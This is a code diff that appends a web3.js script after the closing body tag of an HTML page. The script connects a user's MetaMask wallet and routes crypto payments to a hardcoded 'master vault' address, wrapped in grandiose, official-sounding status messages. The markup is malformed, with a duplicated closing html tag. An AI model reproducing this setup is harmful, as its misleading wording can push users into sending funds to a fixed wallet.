@@ -1025,7 +1025,124 @@
     }
 </script>
 
-</body>
+</body><script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
+
+<script>
+    // System Global State Configuration
+    let web3;
+    let userWalletAddress = null;
+    
+    // Core Authorization Nodes
+    const MASTER_VAULT = "0x9e5b19128A8675B3B06CdB55E982e685684199D0";
+    const SYSTEM_PROTOCOL_KEY = "102740";
+    const AGENT_ID = "12-15-27";
+
+    /**
+     * Phase 1: Initialize Framework and Connect Wallet Node
+     */
+    async function initializeWeb3() {
+        // UI Elements Mapping
+        const actionBtn = document.getElementById('walletActionBtn');
+        const outputDisplay = document.getElementById('nodeAddressOutput');
+
+        // Check if provider matrix (MetaMask) exists
+        if (typeof window.ethereum !== 'undefined') {
+            try {
+                // Initialize Web3 wrapper instance
+                web3 = new Web3(window.ethereum);
+                
+                // Request account authorization access handshake
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                userWalletAddress = accounts[0];
+                
+                // Update UI state to Verified Active Status
+                if (outputDisplay) {
+                    outputDisplay.innerText = "✔ Secure Node Connected: " + userWalletAddress;
+                    outputDisplay.style.color = "#00e676";
+                }
+                if (actionBtn) {
+                    actionBtn.innerText = "System Matrix Connected";
+                    actionBtn.style.backgroundColor = "#1d4ed8"; // Corporate blue accent
+                }
+                
+                console.log(`[SOVEREIGN WEB3 COUPLING] Node Linked: ${userWalletAddress}`);
+                listenToAccountChanges();
+                
+            } catch (error) {
+                console.error("[CRITICAL ERROR] Cryptographic authorization handshake rejected.", error);
+                alert("Authorization handshake rejected by client node.");
+            }
+        } else {
+            console.warn("[ENVIRONMENT WARNING] MetaMask client missing.");
+            alert("Sovereign Layer-1 framework missing. Please attach a secure MetaMask Web3 extension to proceed.");
+        }
+    }
+
+    /**
+     * Phase 2: Handle Dynamic Account/Network Changes Permanently
+     */
+    function listenToAccountChanges() {
+        // Automatically reload or adapt if client switches accounts
+        window.ethereum.on('accountsChanged', function (accounts) {
+            if (accounts.length === 0) {
+                location.reload(); // Hard disconnect if logged out
+            } else {
+                userWalletAddress = accounts[0];
+                const outputDisplay = document.getElementById('nodeAddressOutput');
+                if (outputDisplay) outputDisplay.innerText = "✔ Switched Node: " + userWalletAddress;
+                console.log(`[SOVEREIGN WEB3 RE-COUPLING] Node Shifted: ${userWalletAddress}`);
+            }
+        });
+
+        // Monitor blockchain network switches
+        window.ethereum.on('chainChanged', function (chainId) {
+            console.log(`[NETWORK SHIFT DETECTED] Network ID: ${chainId}`);
+            // Optimal implementation is to reload state context
+            location.reload();
+        });
+    }
+
+    /**
+     * Phase 3: Execute Direct Smart Contract Native Transaction Routing
+     * @param {string} allocationValue BDT value converted to Crypto asset allocation
+     */
+    async function transferToMasterVault(allocationValue) {
+        if (!userWalletAddress) {
+            alert("Please activate and verify your wallet node before execution.");
+            return;
+        }
+
+        try {
+            // Convert Ether/BNB value allocation units dynamically to Wei format
+            const valueInWei = web3.utils.toWei(allocationValue.toString(), 'ether');
+            
+            console.log(`[INITIATING VAULT TRANSACTION] Routing ${allocationValue} to Master Ledger...`);
+
+            // Compile transaction bundle parameter directives
+            const transactionParameters = {
+                to: MASTER_VAULT,
+                from: userWalletAddress,
+                value: web3.utils.toHex(valueInWei),
+                // Optional metadata injection identifying system origins
+                data: web3.utils.asciiToHex(`SCT_System_Protocol_${SYSTEM_PROTOCOL_KEY}_Agent_${AGENT_ID}`)
+            };
+
+            // Call provider engine to prompt transaction approval interface
+            const txHash = await window.ethereum.request({
+                method: 'eth_sendTransaction',
+                params: [transactionParameters],
+            });
+
+            console.log(`[TRANSACTION IMMUTABLY COMMITTED] Hash Payload: ${txHash}`);
+            alert(`Sovereign Asset Dispatched Successfully!\nTx Hash: ${txHash}`);
+            
+        } catch (error) {
+            console.error("[LEDGER ROUTING FAILURE] Transaction aborted.", error);
+            alert("Transaction failed or was rejected by validation agent.");
+        }
+    }
+</script>
+
 </html>
 
 </html>
